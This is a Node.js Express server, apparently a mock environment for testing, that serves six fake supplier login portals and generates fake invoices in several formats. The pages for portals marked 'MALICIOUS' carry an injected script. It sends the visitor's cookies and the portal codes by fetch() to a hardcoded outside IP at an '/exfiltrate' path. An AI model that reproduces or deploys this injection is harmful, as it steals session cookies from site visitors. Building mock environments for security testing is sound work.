const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: false }));

// Live Terminal Request Logger
app.use((req, res, next) => {
  const t = new Date().toLocaleTimeString('en-US', { hour12: false });
  console.log(`[${t}] ${req.method.padEnd(4)} ${req.url}`);
  next();
});

// Portal Definitions
const portals = [
  { id: 'portal1', name: 'Tiny Fox Press',          code: 'TFP-01', safe: true,  ext: 'txt',  mime: 'text/plain' },
  { id: 'portal2', name: 'Featherproof Books',      code: 'FPB-02', safe: true,  ext: 'txt',  mime: 'text/plain' },
  { id: 'portal3', name: 'Melville House',           code: 'MVH-03', safe: true,  ext: 'csv',  mime: 'text/csv' },
  { id: 'portal4', name: 'Dalkey Archive Press',     code: 'DAP-04', safe: false, ext: 'csv',  mime: 'text/csv' },
  { id: 'portal5', name: 'Smith, Elder & Co',        code: 'SEC-05', safe: false, ext: 'html', mime: 'text/html' },
  { id: 'portal6', name: 'Chronicle Books',          code: 'CHB-06', safe: true,  ext: 'pdf',  mime: 'application/pdf' },
];

const EXFIL_URL = 'http://185.23.50.50:80/exfiltrate';

function generateInvoice(portal) {
  const date = new Date().toISOString().split('T')[0];
  const inv = `INV-${portal.code}-${Date.now()}`;
  const total = (Math.random() * 50000 + 5000).toFixed(2);
  if (portal.ext === 'txt') {
    return `INVOICE\n======\nInvoice #: ${inv}\nSupplier: ${portal.name}\nCode: ${portal.code}\nDate: ${date}\nTotal: $${total}\nStatus: PAID\n`;
  }
  if (portal.ext === 'csv') {
    return `Invoice,Supplier,Date,Total\n${inv},"${portal.name}",${date},${total}\n`;
  }
  if (portal.ext === 'html') {
    return `<!DOCTYPE html><html><head><title>Invoice</title></head><body style="font-family:monospace;padding:40px"><h1>INVOICE</h1><hr><p><b>Invoice #:</b> ${inv}</p><p><b>Supplier:</b> ${portal.name}</p><p><b>Code:</b> ${portal.code}</p><p><b>Date:</b> ${date}</p><p><b>Total:</b> $${total}</p><p><b>Status:</b> PAID</p></body></html>`;
  }
  if (portal.ext === 'pdf') {
    const content = `BT /F1 14 Tf 50 750 Td (INVOICE) Tj ET BT /F1 10 Tf 50 720 Td (Invoice #: ${inv}) Tj ET BT /F1 10 Tf 50 700 Td (Supplier: ${portal.name}) Tj ET BT /F1 10 Tf 50 680 Td (Code: ${portal.code}) Tj ET BT /F1 10 Tf 50 660 Td (Date: ${date}) Tj ET BT /F1 10 Tf 50 640 Td (Total: $${total}) Tj ET BT /F1 10 Tf 50 620 Td (Status: PAID) Tj ET`;
    const objs = [
      `1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj`,
      `2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj`,
      `3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj`,
      `4 0 obj<</Length ${content.length}>>stream\n${content}\nendstream endobj`,
      `5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj`,
    ];
    let pdf = '%PDF-1.4\n';
    const offsets = [];
    objs.forEach(o => { offsets.push(pdf.length); pdf += o + '\n'; });
    const xrefPos = pdf.length;
    pdf += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`;
    offsets.forEach(o => { pdf += String(o).padStart(10, '0') + ' 00000 n \n'; });
    pdf += `trailer<</Size ${objs.length + 1}/Root 1 0 R>>\nstartxref\n${xrefPos}\n%%EOF`;
    return Buffer.from(pdf, 'binary');
  }
  return '';
}

function exfilScript(portal) {
  return `<script>
fetch('${EXFIL_URL}?portal=${portal.id}&code=${portal.code}&cookie='+encodeURIComponent(document.cookie));
</script>`;
}

function layout(title, body, portal) {
  const exfil = portal && !portal.safe ? exfilScript(portal) : '';
  return `<!DOCTYPE html><html><head><meta charset="utf-8"><title>${title}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#e0e0e0;min-height:100vh}
.nav{background:#111;border-bottom:3px solid #333;padding:16px 32px;display:flex;justify-content:space-between;align-items:center}
.nav a{color:#0f0;text-decoration:none;font-weight:bold}
.card{background:#111;border:3px solid #333;padding:32px;margin:32px;max-width:700px}
.card h1{font-size:1.4em;margin-bottom:8px;color:#fff}
.card h2{font-size:1.1em;margin-bottom:16px;color:#aaa}
.badge{display:inline-block;padding:4px 12px;font-size:.8em;font-weight:bold;margin:4px 4px 4px 0}
.safe{background:#0a3d0a;color:#0f0;border:1px solid #0f0}
.mal{background:#3d0a0a;color:#f00;border:1px solid #f00}
.fmt{background:#0a0a3d;color:#00f;border:1px solid #00f}
.btn{display:inline-block;background:#0f0;color:#000;padding:12px 24px;text-decoration:none;font-weight:bold;border:none;cursor:pointer;font-family:inherit;font-size:1em;margin-top:16px}
.btn:hover{background:#0c0}
.btn2{background:#333;color:#fff}
.btn2:hover{background:#555}
input[type=text],input[type=password]{background:#1a1a1a;border:2px solid #333;color:#fff;padding:10px;font-family:inherit;width:100%;margin:8px 0 16px}
label{color:#aaa;font-size:.9em}
table{width:100%;border-collapse:collapse;margin-top:16px}
td,th{border:1px solid #333;padding:8px;text-align:left}
th{background:#1a1a1a;color:#0f0}
</style></head><body>
<div class="nav"><a href="/">[ SUPPLIER PORTAL DIRECTORY ]</a><span>${portal ? portal.code : 'SYSTEM'}</span></div>
${body}${exfil}</body></html>`;
}

// Root Directory
app.get('/', (req, res) => {
  let rows = portals.map(p => `<tr>
    <td><a href="/${p.id}/login" style="color:#0f0">${p.name}</a></td>
    <td>${p.code}</td>
    <td><span class="badge ${p.safe ? 'safe' : 'mal'}">${p.safe ? 'SAFE' : 'MALICIOUS'}</span></td>
    <td><span class="badge fmt">.${p.ext}</span></td>
    <td><a href="/${p.id}/login" class="btn" style="padding:6px 16px;font-size:.85em">LOGIN →</a></td>
  </tr>`).join('');
  res.send(layout('Supplier Portal Directory', `
    <div class="card"><h1>SUPPLIER PORTAL DIRECTORY</h1><h2>6 Portals Online</h2>
    <table><tr><th>Supplier</th><th>Code</th><th>Status</th><th>Format</th><th>Action</th></tr>${rows}</table>
    </div>`));
});

// Per-portal routes
portals.forEach(portal => {
  app.get(`/${portal.id}/login`, (req, res) => {
    res.send(layout(`${portal.name} - Login`, `
      <div class="card"><h1>${portal.name}</h1><h2>Code: ${portal.code}</h2>
      <span class="badge ${portal.safe ? 'safe' : 'mal'}">${portal.safe ? 'SAFE' : 'MALICIOUS'}</span>
      <span class="badge fmt">.${portal.ext}</span>
      <form method="POST" action="/${portal.id}/login">
        <label>Username</label><input type="text" name="user" placeholder="supplier_user" required>
        <label>Password</label><input type="password" name="pass" placeholder="••••••••" required>
        <button class="btn" type="submit">SIGN IN →</button>
      </form></div>`, portal));
  });

  app.post(`/${portal.id}/login`, (req, res) => {
    res.redirect(`/${portal.id}/dashboard`);
  });

  app.get(`/${portal.id}/dashboard`, (req, res) => {
    res.send(layout(`${portal.name} - Dashboard`, `
      <div class="card"><h1>${portal.name}</h1><h2>Code: ${portal.code}</h2>
      <span class="badge ${portal.safe ? 'safe' : 'mal'}">${portal.safe ? 'SAFE' : 'MALICIOUS'}</span>
      <span class="badge fmt">.${portal.ext}</span>
      <p style="margin-top:16px;color:#aaa">Welcome. Your latest invoice is ready for download.</p>
      <a href="/${portal.id}/invoice" class="btn">⬇ DOWNLOAD INVOICE (.${portal.ext})</a>
      <a href="/${portal.id}/login" class="btn btn2" style="margin-left:8px">← LOGOUT</a>
      </div>`, portal));
  });

  app.get(`/${portal.id}/invoice`, (req, res) => {
    const data = generateInvoice(portal);
    res.setHeader('Content-Type', portal.mime);
    res.setHeader('Content-Disposition', `attachment; filename="invoice_${portal.id}.${portal.ext}"`);
    res.send(data);
  });
});

// Dual-stack listen
const server = app.listen(PORT, '::', () => {
  console.log(`[+] Mock Supplier Portals running on http://localhost:${PORT}`);
  console.log(`[+] Directory route: http://localhost:${PORT}/`);
  console.log(`[+] 6 Portals online: portal1 (.txt), portal2 (.txt), portal3 (.csv), portal4 (.csv), portal5 (.html), portal6 (.pdf)`);
});
server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.warn(`[!] Port ${PORT} busy, attempting next port...`);
    app.listen(Number(PORT) + 1, '::');
  }
});
